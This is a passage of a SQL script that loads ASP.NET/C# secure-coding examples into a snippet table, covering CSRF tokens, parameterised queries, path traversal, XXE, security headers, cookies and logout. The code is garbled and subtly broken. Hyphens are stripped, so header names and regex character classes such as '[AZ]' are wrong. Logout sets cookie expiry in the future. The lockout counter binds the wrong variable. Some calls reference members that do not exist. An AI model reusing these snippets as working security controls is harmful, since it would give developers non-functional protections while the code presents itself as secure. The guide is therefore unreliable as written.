	to the session IDs from secure.example.com.
	*/
	
	<system.web>
		<httpCookies domain="demo.mySite.com" />
	</system.web>
	
', 'Session Cookies (Domain)', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('XContentTypeOptions header


 Example:


    /*
    In order to set the "XContentTypeOptions" header you''ll have to add the 
    following code to the head of your application, the following code could be used in your controller:
    */
    
    Response.AppendHeader("XContentTypeOptions", "nosniff"); 
    
	/*
	In your classes you can use the following code:
	*/
	
	HttpContext.Current.Response.AppendHeader("XContentTypeOptions", "nosniff"); 
	

', 'X content type pptions header', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('Enforce secure password


 Example:

	
	using System;
	using System.Collections.Generic;
	using System.Linq;
	using System.Web;
	using System.Text.RegularExpressions;
	using System.IO;


	namespace MvcApplication1.Controllers
	{
		public class passwordcheck
		{
			public bool checkPassword(string password)
			{
				string error = "";
				bool complete = true;

				/*
				Here we define the minimal expected value''s for your password.
				The password must at least contain a Capital letter, a normal letter, a special character
				a number and must be at least 8 characters long
				*/
				string[] pattern = new string[3] { "[09]", "[AZ]", "[az]" };

				foreach (string validation in pattern)
				{
					//Now if the regex detects any missing character than we will set complete to false
					Regex regex = new Regex(validation);
					Match match = regex.Match(password);

					if (!match.Success)
					{
						error = "You did not enter a valid password";
						complete = false;
					}
				}

				try
				{
					/*
					Also very important is the fact that you have to take into consideration that
					Password1! is a valid password according to password standards. This however is not the case since
					this password is included in almost every dictionary attack system. So we have to prevent 
					the user from using these weak passwords, this we do by defining these bad passwords in a text 
					file and compare the user''s password with the bad passwords defined in the text file.
					*/

					StreamReader sr = new StreamReader(@"C:\Users\Public\xml\test.txt", true);
					String FileText = sr.ReadToEnd().ToString();

					string[] strTemp = FileText.Split('','');

					foreach (string value in strTemp)
					{
						if (value == password)
						{
							error = "Your password was a bad password!";
							complete = false;
						}
					}

					sr.Close();
				}
				catch{
					HttpContext.Current.Response.Write("catching file failed");
					throw;
				}

				//The last step is checking the password length to see if it is 8 characters or bigger
				if (password.Length < 8)
				{
					error = "The password was to short";
					complete = false;
				}

				if (complete == true)
				{
					//Do further operation
					HttpContext.Current.Response.Write("Good job password was ok!");
					return true;
				}else{
					HttpContext.Current.Response.Write(error);
					return false;
				}
			}
		}
	}

', 'Enforce secure password', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('RFD and file download injections


 Example:
	

	using System;
	using System.Collections.Generic;
	using System.Linq;
	using System.Web;
	using System.Net;
	using System.Data.SqlClient;

	namespace MvcApplication1.Controllers
	{
		public class downloadFiles
		{
			//Here we connect to the database by means of a connection string as configured in the web.config
			SqlConnection conn = new
			SqlConnection(System.Configuration.ConfigurationManager.ConnectionStrings["download"].ConnectionString);

			private string fileName;
			private bool proceed = true;
			private string mimeType;

			validation validate = new validation();
			whitelist whitelist = new whitelist();

			public void downloadUserFiles(int fileID)
			{
				/*
				For the sake of example we only allow the users to download their own files
				by identifier based sql query''s. As you can see we select the filename
				by its id. in this case we prevent direct userinput into the disposition header.
				*/

				//Since we only expect an integer back from the user we validate the userinput for integers
				if (validate.validateInput(Convert.ToString(fileID), "numeric", "invalid input", "HIGH") == false) { proceed = false; }

				if (proceed == true)
				{
					conn.Open();
					string query = string.Format("SELECT * FROM downloads WHERE userID=@userID and fileID=@fileID");
					SqlCommand cmd = new SqlCommand(query, conn);

					//We bind the parameter in order to prevent sql injections
					cmd.Parameters.AddWithValue("@userID", Session["userID"]);
					cmd.Parameters.AddWithValue("@fileID", fileID);

					//Next we read the value from the database and put it into a variable
					using (SqlDataReader oReader = cmd.ExecuteReader())
					{
						while (oReader.Read())
						{
							fileName = Convert.ToString(oReader["fileName"]);
							mimeType = Convert.ToString(oReader["mimeType"]);
						}
					}
					if (fileName != null)
					{
						try
						{
							/*
							We also define the mimetype per download file.
							This is because whenever a user can only download images it is not necessary to set
							an uncommon contenttype header for it.
							NOTE: These mimetypes should not be stored based upon the mimetype which was send 
							the response header when the user uploaded the file. This value can be easily 
							manipulated with an intercepting proxy. You should get the mimetype from the file
							itself after it was stored on the server.
							*/
							System.Web.HttpResponse response = System.Web.HttpContext.Current.Response;
							response.ClearContent();
							response.Clear();
							response.ContentType = mimeType;
							response.AppendHeader("CacheControl", "nocache");
							response.AddHeader("ContentDisposition", "attachment; filename=" + fileName + ";");
							response.WriteFile(@"\\servername\folder1\folder2\folder3\" + fileName + "");
							response.Flush();
							response.End();
						}
						catch (NullReferenceException e){
							if (e.Source != null)
							{
								HttpContext.Current.Response.Write("error!");
							}
						}
					}
				}
			}

			public void fixedDownloads(string download)
			{
				/*
				The second example is for whenever you are providing users with fixed downloads
				such as manuals etc. We do not only check if the file just exists, because that would
				allow an attacker to also download important other files from your server, so instead
				we whitelist them.
				*/
				if (whitelist.whitelisting("file1.txt,file2.txt", download) != false)
				{
					System.Web.HttpResponse response = System.Web.HttpContext.Current.Response;
					response.ClearContent();
					response.Clear();
					response.ContentType = "text/plain";
					response.AppendHeader("CacheControl", "nocache");
					response.AddHeader("ContentDisposition", "attachment; filename=" + download + ";");
					response.WriteFile(@"\\servername\folder1\folder2\folder3\" + download + "");
					response.Flush();
					response.End();
				}
			}
		}
	}
', 'RFD File Download Injection Prevention', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('Audit logs


 Example:


   	using System;
	using System.Collections.Generic;
	using System.Linq;
	using System.Web;
	using System.IO;
	using System.Data.SqlClient;
	using System.ComponentModel.DataAnnotations.Schema;
	using System.ComponentModel.DataAnnotations;

	namespace MvcApplication1.Controllers
	{
		[Table("counter")]
		public class auditLogs
		{

			//Getters and setters for our user method
			[Key]
			public int countID { get; set; }
			public int userID  { get; set; }
			public int count   { get; set; }
			public int blocker { get; set; }

			//Here we connect to the database by means of a connection string as configured in the web.config
			SqlConnection conn = new 
			SqlConnection(System.Configuration.ConfigurationManager.ConnectionStrings["users"].ConnectionString);

			public void SetLog(string session, string message, string state, string threat)
			{
				using (StreamWriter writer = new StreamWriter(@"C:\Users\Public\xml\logs.txt", true))
				{
                    writer.WriteLine(session + "  " + message + "  " + HttpContext.Current.Request.ServerVariables["REMOTE_ADDR"] +
                    "  " + state + "  " + DateTime.Now + "  " + threat);
				}
			}

			public void counter(int counting)
			{
				/*
				First we select the counts from the count table in order to verify if the user session should be terminated
				or that the user should be locked out.
				*/
				conn.Open();

				string query = string.Format("SELECT * from counter WHERE userID = @userID ");
				SqlCommand cmd = new SqlCommand(query, conn);

				//We bind the parameter in order to prevent sql injections
				cmd.Parameters.AddWithValue("@userID", System.Web.HttpContext.Current.Session["userID"]);

				//Next we read the value from the database and put it into a variable
				using (SqlDataReader oReader = cmd.ExecuteReader())
				{
					while (oReader.Read())
					{
						count   = Convert.ToInt32(oReader["count"]);
						blocker = Convert.ToInt32(oReader["blocker"]);
					}
				}

				//We add the counting to the database results for the final value
				int finalCount = counting += count;
				int finalBlock = counting += blocker;

				/*
				then we update the count table in order to keep track of the number of counts
				*/
				try
				{
					using (SqlCommand command = conn.CreateCommand())
					{
						command.CommandText = "UPDATE counter set count = @count, blocker = @blocker WHERE userID = @userID";

						//Again we bind the parameters in order to prevent SQL injections
						command.Parameters.AddWithValue("@count", finalCount);
						command.Parameters.AddWithValue("@blocker", finalCount);
						command.Parameters.AddWithValue("@userID", System.Web.HttpContext.Current.Session["userID"]);

						command.ExecuteNonQuery();
					}
				}
				catch (SqlException e){
					if (e.Source != null)
					{
						System.Web.HttpContext.Current.Response.Write("SQL insert query error in update counter");
						throw;
					}
				}
				conn.Close();


				/*
				After these steps we check whether the user should be blocked, whenever the count is equal to 12 we take
				further actions by means of blocking the users account and terminating his session
				*/

				if (finalBlock >= 12)
				{
					try
					{
						using (SqlCommand command = conn.CreateCommand())
						{
							conn.Open();
							string access = "FALSE";
							command.CommandText = "UPDATE users set access = @access WHERE userID = @userID";

							//Again we bind the parameters in order to prevent SQL injections
							command.Parameters.AddWithValue("@access", access);
							command.Parameters.AddWithValue("@userID", System.Web.HttpContext.Current.Session["userID"]);

							command.ExecuteNonQuery();

							HttpContext.Current.Session["authenticateUser"] = "";
							HttpContext.Current.Session.Abandon();
							HttpContext.Current.Response.Redirect("/login", true);
						}
					}
					catch (SqlException e){
						if (e.Source != null)
						{
							System.Web.HttpContext.Current.Response.Write("SQL insert query error");
							System.Web.HttpContext.Current.Response.Write(e);
						}
					}
				}
				
				/*
				If the count hit three, the user gets a warning by means of a session termination.
				Whenever this termination occurs three times he will lock out his account.
				*/
				if (finalCount >= 3)
				{
					HttpContext.Current.Session["authenticateUser"] = "";
					HttpContext.Current.Session.Abandon();
					HttpContext.Current.Response.Redirect("/login", true);
				}
			}
		}
	}
', 'Audit Logs', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('CSRF tokens


 Example:
    
	
    /*
    For CSRF tokens we used a separate class outside of the normal controller, since
    it must be reused on several locations throughout the application
    
	First after a successful validation of a user login, the application must also start a session
	which contains the "cross site request forgery" token.
    */
    
	/*
	For generating the token we want to use a secure cryptographic function
	in order to use RNGCryptoServiceProvider we must first add :
	using System.Security.Cryptography;
	*/
	RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider();

	//Then we generate a long value token containing a high entropy
	byte[] buffer = new byte[128];

	rng.GetBytes(buffer);

	//Then we base64 encode the string
	string csrftoken = System.Convert.ToBase64String(buffer);

	System.Web.HttpContext.Current.Session["CSRF"] = csrftoken; 

	/*
	The next step is implementing this random token in each form field as a hidden input parameter
	and send it to a function which checks if the submitted token is equal to the one set after successful validation.
	*/

	<form method="post" action="/Home/csrf">
    <input type="text" name="testValue" />
    <input type="hidden" name="csrftoken" value="@Session["CSRF"];" />
    <input type="submit" value="submit the form" />
    </form>
	
	//here we are sending the token towards the function which does the token validation    
	public void checkCSRF(string token)
	{
		string Sessiontoken = Convert.ToString(System.Web.HttpContext.Current.Session["CSRF"]);
	
		//We compare the incoming token with the current session Token which was assigned on login
		if(Sessiontoken != token)
		{	
			/*
			If there was no match the authentication session will be emptied and sessions
			Will be abandoned, we redirect the user towards the login page.
			*/
		
			HttpContext.Current.Session["authenticateUser"] = "";
			HttpContext.Current.Session.Abandon();
			HttpContext.Current.Response.Redirect("/login", true);            
		}           
	
	}     
	


	', 'CSRF Tokens', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('Logout functionality


 Example:
	

	using System;
	using System.Collections.Generic;
	using System.Linq;
	using System.Web;

	namespace MvcApplication1.Controllers
	{
		public class logout
		{
			public void logOut()
			{   
				//We clear abandon and remove all sessions before we start
				HttpContext.Current.Session.Clear();
				HttpContext.Current.Session.Abandon();
				HttpContext.Current.Session.RemoveAll();
		   
				//Double check this and empty your session manually
				HttpContext.Current.Session["Authenticated"] = "";

				//Clear the aspsessionID
				if (HttpContext.Current.Request.Cookies["ASP.NET_SessionId"] != null)
				{
					HttpContext.Current.Response.Cookies["ASP.NET_SessionId"].Value = string.Empty;
					HttpContext.Current.Response.Cookies["ASP.NET_SessionId"].Expires = DateTime.Now.AddMonths(20);
				}

				//Clear our custom set cookie.
				if (HttpContext.Current.Request.Cookies["AuthToken"] != null)
				{
					HttpContext.Current.Response.Cookies["AuthToken"].Value = string.Empty;
					HttpContext.Current.Response.Cookies["AuthToken"].Expires = DateTime.Now.AddMonths(20);
				}
				HttpContext.Current.Response.Redirect("/login", true);
			}
		}
	}', 'Logout', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('Timeout a session


 Example:


	/*
	Within your web.config you can configure your session idle timeout.
	The default time is set to 20 minutes.
	*/
		
	<configuration>
	   <system.web>
		  <sessionState mode="InProc"
				cookieless="true"
				timeout="20"/> < Here is where we set the timeout by minutes
		  </sessionState>
	   </system.web>
	</configuration>', 'Timeout a Session', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Whitelisting


 Example:
	

	using System;
	using System.Collections.Generic;
	using System.Linq;
	using System.Web;

	namespace MvcApplication1.Controllers
	{
		public class whitelist
		{
			//Include auditlog class
			auditLogs Log = new auditLogs();

			public bool whitelisting(string allowed, string input)
			{
				/*
				Here we define a whitelist of pages we want the user allow to be redirected to, all 
				patterns are terminated whenever they not comply with the predefined withelist
				*/

				string[] pattern = allowed.Split('','');

				//For validation if the file returned true
				bool validated = false;

				//To catch the user submitting evil requests we count the number of times the foreach hits false
				int count = 0;
				int countArray = 0;

				int counter = allowed.Length;

				foreach (string item in pattern)
				{
					//If filename is equal to the predefined items
					if (input == item)
					{
						validated = true;
						count = 1;
					}

					//Here we add up the counts, if they are equal we know the function did not hit a valid filename
					count++;
					countArray++;
				}
			
				if (countArray == count)
				{
					//this breach has to be reported into the log files
					Log.setLog(HttpContext.Current.Session["userID"], "Audit log message!", "FAIL", "HIGH");
					Log.setCounter.count(3);
				}
				return validated;
			}
		}
	}', 'White listing', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('Random password/token generation


 Example:


	using System;
	using System.Collections.Generic;
	using System.Linq;
	using System.Web;
	using System.Security.Cryptography;

	namespace MvcApplication1.Controllers
	{
		public class randomizer
		{
			public string generate(int numberOfBytes)
			{
				/*
				For generating the password we want to use a secure cryptographic function
				*/
				RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider();

				//Then set the size of the password
				byte[] buffer = new byte[numberOfBytes];
				rng.GetBytes(buffer);

				//Then we base64 encode the string in order to prevent null bytes
				string randomString = System.Convert.ToBase64String(buffer);

				return randomString;
			}
		}
	}

	
', 'Random Password Token Generation', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('Path traversal


 Example:

	using System;
	using System.Collections.Generic;
	using System.Linq;
	using System.Web;
	using System.Text.RegularExpressions;
	using System.IO;

	namespace MvcApplication1.Controllers
	{
		public class rewrite
		{
			auditLogs Log = new auditLogs();
			inputvalidation validate = new inputvalidation();
			whitelist listme = new whitelist();

			public void getFiles(string getFile)
			{
				/*
				First, we want to filter the filenames for expected values. For this example we use only use 09
				Whenever the values are tampered with, we can assume an attacker is trying to inject malicious input.           
				*/
				bool validated = true;

				//see the "input validation" code example for more detailed information about this function
				if (validate.validateInput(getFile, "numeric", "Failed to get file", "HIGH") == false) { validated = false;}

				/*
				see the "whitelisting" code example for more detailed information about this function
				Let''s assume there are three files named 1,2,3
				*/
				
				if (listme.whitelisting("1,2,3", getFile) == false) { validated = false; }

				//Only if the pattern was true we allow the variable into the streamreader function
				if (validated == true)
				{
					try
					{
						StreamReader sr = new StreamReader(@"C:\Users\Public\xml\" + getFile + ".txt", true);
						String FileText = sr.ReadToEnd().ToString();

						sr.Close();
					}
					catch(DirectoryNotFoundException e){
						if (e.Source != null)
						{
							HttpContext.Current.Response.Write("catching file failed");
						}
					}
				}else{
					HttpContext.Current.Response.Write("invalid userinput was detected!");
				}
			}
		}
	}
	

', 'Directory Path Traversal', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('Session cookies HttpOnly


 Example:

	/*
	Whenever a session is started, the "httpOnly" option should always be set
	in order to prevent session data to be stolen by attackers.
	
    By default, .NET 2.0 sets the HttpOnly attribute for:
    Session ID,
    Forms Authentication cookie

    In .NET 2.0, HttpOnly can also be set via the HttpCookie object for all custom application 
    cookies via web.config in the system.web/httpCookies element
	*/
	
	<httpCookies httpOnlyCookies="true"> 

    //Or programmatically
	//C Code:

	HttpCookie myCookie = new HttpCookie("AuthToken", guid);
	HttpContext.Current.Response.Cookies.Add(myCookie);
	myCookie.HttpOnly = true;

	

	
', 'Session Cookies HttpOnly', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('SQL query


 Example:


	/*
	In c MVC there are a lot of different methods in order to process your SQL query''s to 
	the database. Most of them are already secure by design and leave little to no room for
	error such as SQL to LinQ or doing your database handling by the entity framework.

	However if you want to use the sql command method you must use this functionality by
	means of prepared statements in order to prevent sql injections.
	*/


	using System;
	using System.Collections.Generic;
	using System.Linq;
	using System.Web;
	using System.ComponentModel.DataAnnotations.Schema;
	using System.ComponentModel.DataAnnotations;
	using System.Data.SqlClient;
	using System.Web.SessionState;


	namespace MvcApplication1.Models
	{
		[Table("users")]
		public class users
		{
			//Getters and setters for our user method
			[Key]
		
			public int userID      { get; set; }
			public string username { get; set; }
			public string email    { get; set; }

			//First we include the audit log class.
			//AuditLog Log = new AuditLog();

			//Here we connect to the database by means of a connection string as configured in the web.config
			SqlConnection conn = new 
			SqlConnection(System.Configuration.ConfigurationManager.ConnectionStrings["users"].ConnectionString);

			public void selectStatement()
			{   
				//Open the database connection
				conn.Open();

				try
				{   
					string query = string.Format("SELECT * from users WHERE userId = @userID ");
					SqlCommand cmd = new SqlCommand(query, conn);

					//We bind the parameter in order to prevent sql injections
					cmd.Parameters.AddWithValue("@userID", System.Web.HttpContext.Current.Session["userID"]);

					//Next we read the value from the database and put it into a variable
					using (SqlDataReader oReader = cmd.ExecuteReader())
					{
						while (oReader.Read())
						{
							username = oReader["username"].ToString();
							email    = oReader["email"].ToString();

						}
					}
					//close the connection again
					conn.Close();
				}
				catch(SqlException e){
					if (e.Source != null)
					{
						System.Web.HttpContext.Current.Response.Write("Invalid select query");
						throw;
					}
				}
			}

			public void insertStatement()
			{   
				//We open the connection towards the database
				conn.Open();

				try
				{
					using (SqlCommand command = conn.CreateCommand())
					{ 
					
						command.CommandText = "INSERT INTO users(username,email) VALUES(@param1,@param2)";  
					
						//Again we bind the parameters in order to prevent SQL injections
						command.Parameters.AddWithValue("@param1", username);  
						command.Parameters.AddWithValue("@param2", email);   

						command.ExecuteNonQuery(); 
					}
				}
				catch(SqlException e){
					if(e.Source != null)
					{
						System.Web.HttpContext.Current.Response.Write("SQL insert query error");
						throw;
					}
				}

				//we close the connection again
				conn.Close();
			}
		}
	}
	
	



	
', 'SQL Query', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('Reauthentication


 Example:
	

	using System;
	using System.Collections.Generic;
	using System.Linq;
	using System.Web;
	using System.Data.SqlClient;
	using System.ComponentModel.DataAnnotations;
	using System.Web.SessionState;

	namespace MvcApplication1.Controllers
	{
		public class reauth
		{
			//Getters and setters for our user method
			[Key]
			public int userID { get; set; }
			public string username { get; set; }
			public string password { get; set; }
			public string access { get; set; }
			public string salt { get; set; }
			public int privilege { get; set; }

			//First we include the audit log class.
			auditLogs Log = new auditLogs();

			//Second we include the password hash.
			hashing hash = new hashing();

			//Third we include the random password/token class.
			randomizer CSRF = new randomizer();

			//Add the logout class
			logout logoff = new logout();

			public bool reAuthentication()
			{
				//Here we connect to the database by means of a connection string as configured in the web.config
				SqlConnection conn = new SqlConnection
				(System.Configuration.ConfigurationManager.ConnectionStrings["users"].ConnectionString);

				bool loggedin = false;
				string passwordHash = "";
				conn.Open();

				//Here we select the user from the users table by the sessionID
				string query = string.Format("SELECT * from users WHERE userID = @userID ");
				SqlCommand cmd = new SqlCommand(query, conn);

				//We bind the parameter in order to prevent sql injections
				cmd.Parameters.AddWithValue("@userID", 1);

				//Next we read the value from the database and put it into a variable
				using (SqlDataReader oReader = cmd.ExecuteReader())
				{
					while (oReader.Read())
					{
						passwordHash = Convert.ToString(oReader["password"]);
						salt = Convert.ToString(oReader["salt"]);
					}
				}

				/*
				We validate the password see "Password storage(salting stretching hashing)" in the code examples
				for more detailed information:
				*/
				if (hash.Validate(passwordHash, salt, password) == true)
				{
					//the connection has to be reported into the log files
					Log.SetLog("Null", "login was OK!", "SUCCESS", "NULL");

					/*
					This is is to prevent session fixation, after login we create a new cookie which
					we than use to authenticate. This value can not be fixated since it is set after 
					login.
				 
					create a new GUID and save into the session:
					*/

					//Al the random tokens will now be changed
					string guid = Guid.NewGuid().ToString();
					HttpContext.Current.Session["AuthToken"] = guid;

					// now create a new cookie with this guid value
					HttpContext.Current.Response.Cookies.Add(new HttpCookie("AuthToken", guid));

					/*
					Now we create a random value for our CSRF tokens. See "Random password/token generation" in
					the code examples for more detailed information:
					*/
					string CSRftoken = CSRF.generate(25);
					System.Web.HttpContext.Current.Session["CSRF"] = CSRftoken;

					HttpContext.Current.Session["Authenticated"] = "access";
					loggedin = true;
				}else{
					//If things went wrong we destroy the entire session. see "logout" code example for more info:
					logoff.logOut();
				}
				return loggedin;
			}
		}
	}

', 'Re Authentication', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('Open forwards & redirects


 Example:

	
	/*
	When using forwards & redirects you should make sure the URL is being explicitly 
	declared in the code and cannot be manipulated by an attacker like:
	*/
	
	HttpContext.Current.Response.Redirect("/login", true);
	
	/*
	Generally you should avoid getting input into the redirect which could contain
	userinput by any means. if for any reason this may not be feasible than you 
	should make a whitelist input validation for the redirect like so:
	*/
	
	     
	using System;
	using System.Collections.Generic;
	using System.Linq;
	using System.Web;


	namespace MvcApplication1.Controllers
	{

		public class OpenForwards
		{
			public void openForwards(string redirect)
			{
				whitelist listMe = new whitelist();

				bool validated = true;
			
				//For more information about whitelisting see the "Whitelisting" code example:
				if (listMe.whitelisting("page1,page2,page3", redirect) == false) { validated = false; }
			
				//Only if the pattern was true we allow the variable into the streamreader function
				if (validated == true)
				{
					try
					{
						HttpContext.Current.Response.Redirect(redirect, true);
					}
					catch
					{
						HttpContext.Current.Response.Write("redirect failed");
					}
				}
			}
		}
	}
	

', 'Open Forwards & Redirects', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('Anti clickjacking headers


 Example:

	/*
    One way to defend against clickjacking is to include a "framebreaker" script in each 
	page that should not be framed. The following methodology will prevent a webpage from 
	being framed even in legacy browsers, that do not support the XFrameOptionsHeader.

	In the document HEAD element, add the following:
	
	First apply an ID to the style element itself:
	*/
	
	<style id="antiClickjack">body{display:none !important;}</style>

    //And then delete that style by its ID immediately after in the script:

    <script type="text/javascript">
	   if (self === top) {
		   var antiClickjack = document.getElementById("antiClickjack");
		   antiClickjack.parentNode.removeChild(antiClickjack);
	   } else {
		   top.location = self.location;
	   }
    </script>

	
	/*
	The second option is to use "security headers".
	There are two options for setting the "anticlickjacking" headers in your application:
	*/

	//this will completely prevent your page from being displayed in an iframe.
	Response.AddHeader("XFrameOptions", "deny")


	//this will completely prevent your page from being displayed in an iframe on other sites.
	Response.AddHeader("XFrameOptions", "SAMEORIGIN")
	




	
', 'Anti clickjacking header', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('Xpath query


 Example:

	using System;
	using System.Collections.Generic;
	using System.Linq;
	using System.Web;
	using System.Diagnostics;
	using System.Xml;
	using System.Xml.XPath;
	namespace MvcApplication1.Controllers
	{
		public  class Class1
		{
			public string selectPath(string employeeID)
			{
			    /*
				In order to prevent xpath injections we have to treat these query''s similar as 
				to the sql query''s. An option would be to use a precompiled XPath query.
				But since this is a third party library I consider it untrustworthy and would
				rather use our own crafted escaping function.
			 
				NOTE: if you want to look into the precompiled xpath library you can find more
				detailed information about it on: http://www.tkachenko.com/blog/archives/000385.html
				*/

				/*
				As with every injection prevention we first focus on the expected user values
				in this case we expect an integer we use our single input validation method for integers
				See the "input validation" code example for more detailed information.
			    */

				bool continueFunction = true;
				string foo = "";

				inputvalidation validate = new inputvalidation();

				//Here we put the variable in our inputvalidation method in order to prevent untrustworthy userinput from parsing
				//NOTE: logging and countering is also done in your validation method
				if (validate.validateInput(Convert.ToString(employeeID), "numeric", "xpath input validation", "HIGH") == false) 
				{ continueFunction = false; }

				//Only if our validation function returned true we put the userinput in the function
				if (continueFunction == true)
				{
					XmlDocument xmldoc = new XmlDocument();
					try
					{
						xmldoc.Load(@"C:\Users\Public\xml\register.xml");
						foo = xmldoc.SelectSingleNode("/Employees/Employee[ID=" + employeeID + "]").InnerText;
					}
					catch (Exception e){
						if (e.Source != null)
						{
							System.Web.HttpContext.Current.Response.Write("Oops something went wrong");
							throw;
						}
					}
				}else{
					System.Web.HttpContext.Current.Response.Write("unexpected userinput detected!");
				}
					return foo;
			}
		}
	}

	/* 
	The same principle as seen in the example applies for whenever you expect alphanumeric values or even names. 
	The only difference is that you take another validation type from the input validation function 
	i.e whenever you must accept names like O''Reilly you must encode the quotes.See the "input validation" code example
	for more detailed information about these escape methods.
	*/', 'X Path Query', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('Encoding


 Example:
	
	
	using System;
	using System.Collections.Generic;
	using System.Linq;
	using System.Web;
	using System.Text.RegularExpressions;

	namespace MvcApplication1.Controllers
	{
		public class encoding
		{
			public string encoder(string input, string allowed)
			{
				/*
				We can specify also special characters which where allowed in order to keep
				track of any unwanted special characters, even though they will be encoded
				violations of your system must have consequences!
				*/
				Regex regex = new Regex("^[azAZ09" + allowed + "]+$");
				Match match = regex.Match(input);
				if (!match.Success)
				{
					Log.SetLog(Session[''userID''], logMessage, date, "FAIL", threatLevel);
					Log.count(1);
					input = "Error";
				}
				//We return the userinput encoded
				return HttpUtility.HtmlEncode(input);
			}
		}
	}', 'Encoding', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('Secure session cookies


 Example:

    
	/*
	Whenever  a cookie is sent over a secured connection, the cookie should be set
	with the secure flag, in order to guarantee the integrity of the data it contains.

	in the <system.web> element, add the following element:

	<httpCookies requireSSL="true" />

	whenever you have a <forms> element in your system.web block, this setting will 
	override the setting in httpCookies, changing it''s value back to false.

	In that case, you need to add the requireSSL="true" attribute to the forms element as well.
	*/
	
	<system.web>
		<authentication mode="Forms">
			<forms requireSSL="true"> < secure flag
				/* forms content */
			</forms>
		</authentication>
	</system.web>
	
	
	//Or programmatically
	//C Code:
	
	HttpCookie myCookie = new HttpCookie("AuthToken", guid);
	HttpContext.Current.Response.Cookies.Add(myCookie);
	myCookie.Secure = true;



	
', 'Secure Session Cookies', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('Crossdomain.xml 


 Example:

    
		A bad example of a crossdomain.xml would be:

		<?xml version="1.0" ?>
		<crossdomainpolicy>
			<sitecontrol permittedcrossdomainpolicies="masteronly"/>
			<allowaccessfrom domain="*"/>
			<allowhttprequestheadersfrom domain="*" headers="*"/>
		</crossdomainpolicy>

		Because it allows access from all other domains.

		Instead of this approach you might want to use the following restrictions. 
		Example by twitter''s crossdomain.xml:

		<?xml version="1.0" encoding="UTF8"?>
		<crossdomainpolicy xmlns:xsi="http://www.w3.org/2001/XMLSchemainstance" 
		xsi:noNamespaceSchemaLocation="http://www.adobe.com/xml/schemas/PolicyFile.xsd">
			<allowaccessfrom domain="twitter.com" />
			<allowaccessfrom domain="api.twitter.com" />
			<allowaccessfrom domain="search.twitter.com" />
			<allowaccessfrom domain="static.twitter.com" />
			<sitecontrol permittedcrossdomainpolicies="masteronly"/>
			<allowhttprequestheadersfrom domain="*.twitter.com" headers="*" secure="true"/>
		</crossdomainpolicy>


	
', 'Crossdomain.xml ', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('XML External entities


 Example:


	/*
	The overall prevention method for loading external entities is adding the following line of code:
	This line of code function tells the underlying libxml parsing to not try to interpret the values 
	of the entities in the incoming XML and leave the entity references intact.
	*/

	/*
	In .NET Framework versions 3.5 and earlier, DTD parsing behavior is controlled by the 
	Boolean ProhibitDtd property found in the System.Xml.XmlTextReader and System.Xml.XmlReaderSettings
	classes. Set this value to true to disable inline DTDs completely:
	*/
	
	XmlTextReader reader = new XmlTextReader(stream);
	reader.ProhibitDtd = true;

	//or

	XmlReaderSettings settings = new XmlReaderSettings();
	settings.ProhibitDtd = true;
	XmlReader reader = XmlReader.Create(stream, settings);

	/*
	The default value of ProhibitDtd in XmlReaderSettings is true, but the default value 
	of ProhibitDtd in XmlTextReader is false, which means that you have to explicitly set 
	it to true to disable inline DTDs (NOT RECOMMENDED).
	*/
	
	/*
	In .NET Framework version 4.0, DTD parsing 
	behavior has been changed. The ProhibitDtd property has been deprecated in favor of 
	the new DtdProcessing property. You can set this property to Prohibit (the default value) 
	to cause the runtime to throw an exception if a <!DOCTYPE> element is present in the XML:
	
	At this point, we have hardened this code so that it is much less vulnerable to XML bombs, 
	but we haven''t yet addressed the dangers posed by malicious external entities. 
	You can improve your resilience against these attacks if you customize the behavior 
	of XmlReader by changing its XmlResolver. XmlResolver objects are used to resolve external 
	references, including external entities. XmlTextReader instances, as well as XmlReader 
	instances returned from calls to XmlReader.Create, are prepopulated with default 
	XmlResolvers (actually XmlUrlResolvers). You can prevent XmlReader from resolving 
	external entities while still allowing it to resolve inline entities by setting the 
	XmlResolver property of XmlReaderSettings to null. This is attack surface reduction 
	at work again; if you don''t need the capability, turn it off:
	*/
	
	XmlReaderSettings settings = new XmlReaderSettings();
	settings.ProhibitDtd = false;
	settings.MaxCharactersFromEntities = 1024;
	settings.XmlResolver = null;
	XmlReader reader = XmlReader.Create(stream, settings);

	/*
	Alternatively, you can set the DtdProcessing property to Ignore, which will not throw 
	an exception on encountering a <!DOCTYPE> element but will simply skip over it and not 
	process it. Finally, you can set DtdProcessing to Parse if you do want to allow and process inline DTDs.
	
	For extra detailed information please visit:
	https://msdn.microsoft.com/enus/magazine/ee335713.aspx 

	*/
	



	', 'XML External Entities', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('Anticaching header


 Example:

	    
	/*
	Add the following headers to your application head in order to prevent the browser from caching
	the following code could be used in your controller:
	*/

	Response.AppendHeader("CacheControl", "nocache, nostore, mustrevalidate"); // HTTP 1.1.
	Response.AppendHeader("Pragma", "nocache"); // HTTP 1.0.
	Response.AppendHeader("Expires", "0"); // Proxies.

	
	/*
	In your classes you can use the following code:
	*/

